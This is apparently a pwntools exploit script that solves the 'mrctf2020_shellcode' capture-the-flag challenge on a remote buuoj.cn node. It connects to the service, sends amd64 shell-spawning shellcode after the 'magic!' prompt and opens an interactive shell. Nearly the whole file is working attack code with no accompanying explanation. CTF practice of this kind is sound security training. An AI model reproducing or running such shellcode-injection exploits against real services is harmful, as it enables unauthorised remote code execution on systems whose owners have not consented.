from pwn import *
from LibcSearcher import LibcSearcher

#
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='i386', log_level='debug')
#io = process('./mrctf2020_shellcode')
#
io = connect('node5.buuoj.cn',26546)
elf=ELF('./mrctf2020_shellcode')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('magic!\n')
sc=asm(shellcraft.amd64.sh())
sl(sc)

#
io.interactive()
